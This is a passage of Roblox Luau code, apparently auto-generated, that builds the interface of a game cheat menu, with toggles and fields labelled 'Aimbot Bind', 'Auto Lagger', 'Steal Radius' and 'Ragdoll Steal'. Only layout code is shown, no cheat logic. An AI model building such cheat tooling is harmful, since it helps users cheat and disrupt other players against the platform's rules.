G.Frame_92.BackgroundTransparency = 1
G.Frame_92.BorderSizePixel = 0
G.Frame_92.ClipsDescendants = true
G.Frame_92.LayoutOrder = 8
G.Frame_92.Size = UDim2.new(1, 0, 0, 38)
G.Frame_92.Visible = false
G.Frame_92.Parent = G.WavePage_Combat

G.TextLabel_55 = Instance.new("TextLabel")
G.TextLabel_55.BackgroundTransparency = 1
G.TextLabel_55.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_55.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_55.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_55.Text = "Bat Lagger Speed"
G.TextLabel_55.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_55.TextSize = 11
G.TextLabel_55.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_55.Parent = G.Frame_92

G.Frame_93 = Instance.new("Frame")
G.Frame_93.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_93.BorderSizePixel = 0
G.Frame_93.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_93.Size = UDim2.new(0, 54, 0, 26)
G.Frame_93.Parent = G.Frame_92

G.UICorner_85 = Instance.new("UICorner")
G.UICorner_85.CornerRadius = UDim.new(0, 6)
G.UICorner_85.Parent = G.Frame_93

G.UIStroke_53 = Instance.new("UIStroke")
G.UIStroke_53.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_53.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_53.Parent = G.Frame_93

G.TextBox_9 = Instance.new("TextBox")
G.TextBox_9.BackgroundTransparency = 1
G.TextBox_9.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_9.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_9.ZIndex = 8
G.TextBox_9.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_9.Text = "40"
G.TextBox_9.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_9.TextSize = 11
G.TextBox_9.ClearTextOnFocus = false
G.TextBox_9.Parent = G.Frame_93

G.Frame_94 = Instance.new("Frame")
G.Frame_94.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_94.BackgroundTransparency = 1
G.Frame_94.BorderSizePixel = 0
G.Frame_94.LayoutOrder = 8
G.Frame_94.Size = UDim2.new(1, 0, 0, 40)
G.Frame_94.Parent = G.WavePage_Combat

G.TextLabel_56 = Instance.new("TextLabel")
G.TextLabel_56.BackgroundTransparency = 1
G.TextLabel_56.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_56.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_56.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_56.Text = "Auto Swing"
G.TextLabel_56.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_56.TextSize = 11
G.TextLabel_56.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_56.Parent = G.Frame_94

G.WaveTogglePill_23 = Instance.new("Frame")
G.WaveTogglePill_23.Name = "WaveTogglePill"
G.WaveTogglePill_23.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_23.BorderSizePixel = 0
G.WaveTogglePill_23.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_23.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_23.ZIndex = 7
G.WaveTogglePill_23:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_23.Parent = G.Frame_94

G.UICorner_86 = Instance.new("UICorner")
G.UICorner_86.CornerRadius = UDim.new(0, 9)
G.UICorner_86.Parent = G.WaveTogglePill_23

G.UIStroke_54 = Instance.new("UIStroke")
G.UIStroke_54.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_54.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_54.Parent = G.WaveTogglePill_23

G.WaveToggleDot_23 = Instance.new("Frame")
G.WaveToggleDot_23.Name = "WaveToggleDot"
G.WaveToggleDot_23.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_23.BorderSizePixel = 0
G.WaveToggleDot_23.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_23.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_23.ZIndex = 8
G.WaveToggleDot_23.Parent = G.WaveTogglePill_23

G.UICorner_87 = Instance.new("UICorner")
G.UICorner_87.CornerRadius = UDim.new(0, 6)
G.UICorner_87.Parent = G.WaveToggleDot_23

G.TextButton_40 = Instance.new("TextButton")
G.TextButton_40.BackgroundTransparency = 1
G.TextButton_40.BorderSizePixel = 0
G.TextButton_40.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_40.ZIndex = 9
G.TextButton_40.Text = ""
G.TextButton_40.Parent = G.WaveTogglePill_23

G.Frame_95 = Instance.new("Frame")
G.Frame_95.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_95.BackgroundTransparency = 1
G.Frame_95.BorderSizePixel = 0
G.Frame_95.LayoutOrder = 86
G.Frame_95.Size = UDim2.new(1, 0, 0, 40)
G.Frame_95.Parent = G.WavePage_Combat

G.TextLabel_57 = Instance.new("TextLabel")
G.TextLabel_57.BackgroundTransparency = 1
G.TextLabel_57.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_57.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_57.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_57.Text = "Auto Lagger"
G.TextLabel_57.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_57.TextSize = 11
G.TextLabel_57.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_57.Parent = G.Frame_95

G.WaveTogglePill_24 = Instance.new("Frame")
G.WaveTogglePill_24.Name = "WaveTogglePill"
G.WaveTogglePill_24.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_24.BorderSizePixel = 0
G.WaveTogglePill_24.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_24.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_24.ZIndex = 7
G.WaveTogglePill_24:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_24.Parent = G.Frame_95

G.UICorner_88 = Instance.new("UICorner")
G.UICorner_88.CornerRadius = UDim.new(0, 9)
G.UICorner_88.Parent = G.WaveTogglePill_24

G.UIStroke_55 = Instance.new("UIStroke")
G.UIStroke_55.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_55.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_55.Parent = G.WaveTogglePill_24

G.WaveToggleDot_24 = Instance.new("Frame")
G.WaveToggleDot_24.Name = "WaveToggleDot"
G.WaveToggleDot_24.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_24.BorderSizePixel = 0
G.WaveToggleDot_24.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_24.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_24.ZIndex = 8
G.WaveToggleDot_24.Parent = G.WaveTogglePill_24

G.UICorner_89 = Instance.new("UICorner")
G.UICorner_89.CornerRadius = UDim.new(0, 6)
G.UICorner_89.Parent = G.WaveToggleDot_24

G.TextButton_41 = Instance.new("TextButton")
G.TextButton_41.BackgroundTransparency = 1
G.TextButton_41.BorderSizePixel = 0
G.TextButton_41.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_41.ZIndex = 9
G.TextButton_41.Text = ""
G.TextButton_41.Parent = G.WaveTogglePill_24

G.Frame_96 = Instance.new("Frame")
G.Frame_96.BackgroundTransparency = 1
G.Frame_96.BorderSizePixel = 0
G.Frame_96.LayoutOrder = 5
G.Frame_96.Size = UDim2.new(1, 0, 0, 34)
G.Frame_96.Parent = G.WavePage_Combat

G.TextLabel_58 = Instance.new("TextLabel")
G.TextLabel_58.BackgroundTransparency = 1
G.TextLabel_58.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_58.Size = UDim2.new(1, -84, 1, 0)
G.TextLabel_58.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_58.Text = "Aimbot Bind"
G.TextLabel_58.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_58.TextSize = 11
G.TextLabel_58.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_58.Parent = G.Frame_96

G.TextButton_42 = Instance.new("TextButton")
G.TextButton_42.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.TextButton_42.BorderSizePixel = 0
G.TextButton_42.Position = UDim2.new(1, -54, 0.5, -12)
G.TextButton_42.Size = UDim2.new(0, 44, 0, 24)
G.TextButton_42.ZIndex = 8
G.TextButton_42.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_42.Text = "E"
G.TextButton_42.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_42.TextSize = 10
G.TextButton_42.Parent = G.Frame_96

G.UICorner_90 = Instance.new("UICorner")
G.UICorner_90.CornerRadius = UDim.new(0, 6)
G.UICorner_90.Parent = G.TextButton_42

G.UIStroke_56 = Instance.new("UIStroke")
G.UIStroke_56.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_56.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_56.Parent = G.TextButton_42

G.TextButton_43 = Instance.new("TextButton")
G.TextButton_43.BackgroundColor3 = Color3.fromRGB(20, 72, 160)
G.TextButton_43.BorderSizePixel = 0
G.TextButton_43.Position = UDim2.new(1, -130, 0.5, -12)
G.TextButton_43.Size = UDim2.new(0, 58, 0, 24)
G.TextButton_43.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_43.Text = "Normal"
G.TextButton_43.TextColor3 = Color3.fromRGB(240, 245, 255)
G.TextButton_43.TextSize = 10
G.TextButton_43.Parent = G.Frame_96

G.UICorner_91 = Instance.new("UICorner")
G.UICorner_91.CornerRadius = UDim.new(0, 4)
G.UICorner_91.Parent = G.TextButton_43

G.UIStroke_57 = Instance.new("UIStroke")
G.UIStroke_57.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_57.Color = Color3.fromRGB(18, 38, 75)
G.UIStroke_57.Parent = G.TextButton_43

G.Frame_97 = Instance.new("Frame")
G.Frame_97.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_97.BackgroundTransparency = 1
G.Frame_97.BorderSizePixel = 0
G.Frame_97.LayoutOrder = 1007
G.Frame_97.Size = UDim2.new(1, 0, 0, 40)
G.Frame_97.Parent = G.WavePage_Combat

G.TextLabel_59 = Instance.new("TextLabel")
G.TextLabel_59.BackgroundTransparency = 1
G.TextLabel_59.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_59.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_59.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_59.Text = "Show Lagger"
G.TextLabel_59.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_59.TextSize = 11
G.TextLabel_59.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_59.Parent = G.Frame_97

G.WaveTogglePill_25 = Instance.new("Frame")
G.WaveTogglePill_25.Name = "WaveTogglePill"
G.WaveTogglePill_25.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_25.BorderSizePixel = 0
G.WaveTogglePill_25.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_25.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_25.ZIndex = 7
G.WaveTogglePill_25:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_25.Parent = G.Frame_97

G.UICorner_92 = Instance.new("UICorner")
G.UICorner_92.CornerRadius = UDim.new(0, 9)
G.UICorner_92.Parent = G.WaveTogglePill_25

G.UIStroke_58 = Instance.new("UIStroke")
G.UIStroke_58.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_58.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_58.Parent = G.WaveTogglePill_25

G.WaveToggleDot_25 = Instance.new("Frame")
G.WaveToggleDot_25.Name = "WaveToggleDot"
G.WaveToggleDot_25.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_25.BorderSizePixel = 0
G.WaveToggleDot_25.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_25.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_25.ZIndex = 8
G.WaveToggleDot_25.Parent = G.WaveTogglePill_25

G.UICorner_93 = Instance.new("UICorner")
G.UICorner_93.CornerRadius = UDim.new(0, 6)
G.UICorner_93.Parent = G.WaveToggleDot_25

G.TextButton_44 = Instance.new("TextButton")
G.TextButton_44.BackgroundTransparency = 1
G.TextButton_44.BorderSizePixel = 0
G.TextButton_44.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_44.ZIndex = 9
G.TextButton_44.Text = ""
G.TextButton_44.Parent = G.WaveTogglePill_25

G.Frame_98 = Instance.new("Frame")
G.Frame_98.BackgroundTransparency = 1
G.Frame_98.BorderSizePixel = 0
G.Frame_98.LayoutOrder = 98
G.Frame_98.Size = UDim2.new(1, 0, 0, 0)
G.Frame_98.Parent = G.WavePage_Combat

G.Frame_99 = Instance.new("Frame")
G.Frame_99.BackgroundTransparency = 1
G.Frame_99.BorderSizePixel = 0
G.Frame_99.LayoutOrder = 91
G.Frame_99.Size = UDim2.new(1, 0, 0, 0)
G.Frame_99.Parent = G.WavePage_Combat

G.Frame_100 = Instance.new("Frame")
G.Frame_100.BackgroundTransparency = 1
G.Frame_100.BorderSizePixel = 0
G.Frame_100.LayoutOrder = 1000
G.Frame_100.Size = UDim2.new(1, 0, 0, 28)
G.Frame_100.Parent = G.WavePage_Combat

G.TextLabel_60 = Instance.new("TextLabel")
G.TextLabel_60.BackgroundTransparency = 1
G.TextLabel_60.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_60.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_60.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_60.Text = "COUNTERS"
G.TextLabel_60.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_60.TextSize = 13
G.TextLabel_60.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_60.Parent = G.Frame_100

G.Frame_101 = Instance.new("Frame")
G.Frame_101.BackgroundTransparency = 1
G.Frame_101.BorderSizePixel = 0
G.Frame_101.LayoutOrder = 93
G.Frame_101.Size = UDim2.new(1, 0, 0, 0)
G.Frame_101.Parent = G.WavePage_Combat

G.Frame_102 = Instance.new("Frame")
G.Frame_102.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_102.BackgroundTransparency = 1
G.Frame_102.BorderSizePixel = 0
G.Frame_102.LayoutOrder = 1001
G.Frame_102.Size = UDim2.new(1, 0, 0, 40)
G.Frame_102.Parent = G.WavePage_Combat

G.TextLabel_61 = Instance.new("TextLabel")
G.TextLabel_61.BackgroundTransparency = 1
G.TextLabel_61.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_61.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_61.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_61.Text = "Bat Counter"
G.TextLabel_61.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_61.TextSize = 11
G.TextLabel_61.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_61.Parent = G.Frame_102

G.WaveTogglePill_26 = Instance.new("Frame")
G.WaveTogglePill_26.Name = "WaveTogglePill"
G.WaveTogglePill_26.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_26.BorderSizePixel = 0
G.WaveTogglePill_26.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_26.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_26.ZIndex = 7
G.WaveTogglePill_26:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_26.Parent = G.Frame_102

G.UICorner_94 = Instance.new("UICorner")
G.UICorner_94.CornerRadius = UDim.new(0, 9)
G.UICorner_94.Parent = G.WaveTogglePill_26

G.UIStroke_59 = Instance.new("UIStroke")
G.UIStroke_59.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_59.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_59.Parent = G.WaveTogglePill_26

G.WaveToggleDot_26 = Instance.new("Frame")
G.WaveToggleDot_26.Name = "WaveToggleDot"
G.WaveToggleDot_26.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_26.BorderSizePixel = 0
G.WaveToggleDot_26.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_26.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_26.ZIndex = 8
G.WaveToggleDot_26.Parent = G.WaveTogglePill_26

G.UICorner_95 = Instance.new("UICorner")
G.UICorner_95.CornerRadius = UDim.new(0, 6)
G.UICorner_95.Parent = G.WaveToggleDot_26

G.TextButton_45 = Instance.new("TextButton")
G.TextButton_45.BackgroundTransparency = 1
G.TextButton_45.BorderSizePixel = 0
G.TextButton_45.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_45.ZIndex = 9
G.TextButton_45.Text = ""
G.TextButton_45.Parent = G.WaveTogglePill_26

G.Frame_103 = Instance.new("Frame")
G.Frame_103.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_103.BackgroundTransparency = 1
G.Frame_103.BorderSizePixel = 0
G.Frame_103.LayoutOrder = 1002
G.Frame_103.Size = UDim2.new(1, 0, 0, 40)
G.Frame_103.Parent = G.WavePage_Combat

G.TextLabel_62 = Instance.new("TextLabel")
G.TextLabel_62.BackgroundTransparency = 1
G.TextLabel_62.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_62.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_62.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_62.Text = "Medusa Counter"
G.TextLabel_62.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_62.TextSize = 11
G.TextLabel_62.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_62.Parent = G.Frame_103

G.WaveTogglePill_27 = Instance.new("Frame")
G.WaveTogglePill_27.Name = "WaveTogglePill"
G.WaveTogglePill_27.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_27.BorderSizePixel = 0
G.WaveTogglePill_27.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_27.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_27.ZIndex = 7
G.WaveTogglePill_27:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_27.Parent = G.Frame_103

G.UICorner_96 = Instance.new("UICorner")
G.UICorner_96.CornerRadius = UDim.new(0, 9)
G.UICorner_96.Parent = G.WaveTogglePill_27

G.UIStroke_60 = Instance.new("UIStroke")
G.UIStroke_60.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_60.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_60.Parent = G.WaveTogglePill_27

G.WaveToggleDot_27 = Instance.new("Frame")
G.WaveToggleDot_27.Name = "WaveToggleDot"
G.WaveToggleDot_27.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_27.BorderSizePixel = 0
G.WaveToggleDot_27.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_27.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_27.ZIndex = 8
G.WaveToggleDot_27.Parent = G.WaveTogglePill_27

G.UICorner_97 = Instance.new("UICorner")
G.UICorner_97.CornerRadius = UDim.new(0, 6)
G.UICorner_97.Parent = G.WaveToggleDot_27

G.TextButton_46 = Instance.new("TextButton")
G.TextButton_46.BackgroundTransparency = 1
G.TextButton_46.BorderSizePixel = 0
G.TextButton_46.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_46.ZIndex = 9
G.TextButton_46.Text = ""
G.TextButton_46.Parent = G.WaveTogglePill_27

G.Frame_104 = Instance.new("Frame")
G.Frame_104.BackgroundTransparency = 1
G.Frame_104.BorderSizePixel = 0
G.Frame_104.LayoutOrder = 96
G.Frame_104.Size = UDim2.new(1, 0, 0, 0)
G.Frame_104.Parent = G.WavePage_Combat

G.Frame_105 = Instance.new("Frame")
G.Frame_105.BackgroundTransparency = 1
G.Frame_105.BorderSizePixel = 0
G.Frame_105.LayoutOrder = 1006
G.Frame_105.Size = UDim2.new(1, 0, 0, 28)
G.Frame_105.Parent = G.WavePage_Combat

G.TextLabel_63 = Instance.new("TextLabel")
G.TextLabel_63.BackgroundTransparency = 1
G.TextLabel_63.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_63.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_63.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_63.Text = "LAGGER PANEL"
G.TextLabel_63.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_63.TextSize = 13
G.TextLabel_63.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_63.Parent = G.Frame_105

G.Frame_106 = Instance.new("Frame")
G.Frame_106.BackgroundTransparency = 1
G.Frame_106.BorderSizePixel = 0
G.Frame_106.LayoutOrder = 903
G.Frame_106.Size = UDim2.new(1, 0, 0, 38)
G.Frame_106.Parent = G.WavePage_Combat

G.TextLabel_64 = Instance.new("TextLabel")
G.TextLabel_64.BackgroundTransparency = 1
G.TextLabel_64.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_64.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_64.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_64.Text = "Steal Radius"
G.TextLabel_64.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_64.TextSize = 11
G.TextLabel_64.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_64.Parent = G.Frame_106

G.Frame_107 = Instance.new("Frame")
G.Frame_107.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_107.BorderSizePixel = 0
G.Frame_107.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_107.Size = UDim2.new(0, 54, 0, 26)
G.Frame_107.Parent = G.Frame_106

G.UICorner_98 = Instance.new("UICorner")
G.UICorner_98.CornerRadius = UDim.new(0, 6)
G.UICorner_98.Parent = G.Frame_107

G.UIStroke_61 = Instance.new("UIStroke")
G.UIStroke_61.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_61.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_61.Parent = G.Frame_107

G.TextBox_10 = Instance.new("TextBox")
G.TextBox_10.BackgroundTransparency = 1
G.TextBox_10.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_10.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_10.ZIndex = 8
G.TextBox_10.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_10.Text = "60"
G.TextBox_10.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_10.TextSize = 11
G.TextBox_10.ClearTextOnFocus = false
G.TextBox_10.Parent = G.Frame_107

G.Frame_108 = Instance.new("Frame")
G.Frame_108.BackgroundTransparency = 1
G.Frame_108.BorderSizePixel = 0
G.Frame_108.LayoutOrder = 904
G.Frame_108.Size = UDim2.new(1, 0, 0, 38)
G.Frame_108.Parent = G.WavePage_Combat

G.TextLabel_65 = Instance.new("TextLabel")
G.TextLabel_65.BackgroundTransparency = 1
G.TextLabel_65.Position = UDim2.new(0, 14, 0, 0)
G.TextLabel_65.Size = UDim2.new(1, -78, 1, 0)
G.TextLabel_65.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_65.Text = "Steal Duration"
G.TextLabel_65.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_65.TextSize = 11
G.TextLabel_65.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_65.Parent = G.Frame_108

G.Frame_109 = Instance.new("Frame")
G.Frame_109.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.Frame_109.BorderSizePixel = 0
G.Frame_109.Position = UDim2.new(1, -64, 0.5, -13)
G.Frame_109.Size = UDim2.new(0, 54, 0, 26)
G.Frame_109.Parent = G.Frame_108

G.UICorner_99 = Instance.new("UICorner")
G.UICorner_99.CornerRadius = UDim.new(0, 6)
G.UICorner_99.Parent = G.Frame_109

G.UIStroke_62 = Instance.new("UIStroke")
G.UIStroke_62.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_62.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_62.Parent = G.Frame_109

G.TextBox_11 = Instance.new("TextBox")
G.TextBox_11.BackgroundTransparency = 1
G.TextBox_11.Position = UDim2.new(0, 3, 0, 0)
G.TextBox_11.Size = UDim2.new(1, -6, 1, 0)
G.TextBox_11.ZIndex = 8
G.TextBox_11.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_11.Text = "1.35"
G.TextBox_11.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextBox_11.TextSize = 11
G.TextBox_11.ClearTextOnFocus = false
G.TextBox_11.Parent = G.Frame_109

G.Frame_110 = Instance.new("Frame")
G.Frame_110.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_110.BackgroundTransparency = 1
G.Frame_110.BorderSizePixel = 0
G.Frame_110.LayoutOrder = 902
G.Frame_110.Size = UDim2.new(1, 0, 0, 40)
G.Frame_110.Parent = G.WavePage_Combat

G.TextLabel_66 = Instance.new("TextLabel")
G.TextLabel_66.BackgroundTransparency = 1
G.TextLabel_66.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_66.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_66.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_66.Text = "Ragdoll Steal"
G.TextLabel_66.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_66.TextSize = 11
G.TextLabel_66.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_66.Parent = G.Frame_110

G.WaveTogglePill_28 = Instance.new("Frame")
G.WaveTogglePill_28.Name = "WaveTogglePill"
G.WaveTogglePill_28.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_28.BorderSizePixel = 0
G.WaveTogglePill_28.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_28.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_28.ZIndex = 7
G.WaveTogglePill_28:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_28.Parent = G.Frame_110

G.UICorner_100 = Instance.new("UICorner")
G.UICorner_100.CornerRadius = UDim.new(0, 9)
G.UICorner_100.Parent = G.WaveTogglePill_28

G.UIStroke_63 = Instance.new("UIStroke")
G.UIStroke_63.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_63.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_63.Parent = G.WaveTogglePill_28

G.WaveToggleDot_28 = Instance.new("Frame")
G.WaveToggleDot_28.Name = "WaveToggleDot"
G.WaveToggleDot_28.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_28.BorderSizePixel = 0
G.WaveToggleDot_28.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_28.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_28.ZIndex = 8
G.WaveToggleDot_28.Parent = G.WaveTogglePill_28

G.UICorner_101 = Instance.new("UICorner")
G.UICorner_101.CornerRadius = UDim.new(0, 6)
G.UICorner_101.Parent = G.WaveToggleDot_28

G.TextButton_47 = Instance.new("TextButton")
G.TextButton_47.BackgroundTransparency = 1
G.TextButton_47.BorderSizePixel = 0
G.TextButton_47.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_47.ZIndex = 9
G.TextButton_47.Text = ""
G.TextButton_47.Parent = G.WaveTogglePill_28

G.Frame_111 = Instance.new("Frame")
G.Frame_111.BackgroundTransparency = 1
G.Frame_111.BorderSizePixel = 0
G.Frame_111.LayoutOrder = 900
G.Frame_111.Size = UDim2.new(1, 0, 0, 22)
G.Frame_111.Parent = G.WavePage_Combat

G.TextLabel_67 = Instance.new("TextLabel")
G.TextLabel_67.BackgroundTransparency = 1
G.TextLabel_67.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_67.Size = UDim2.new(1, -14, 1, 0)
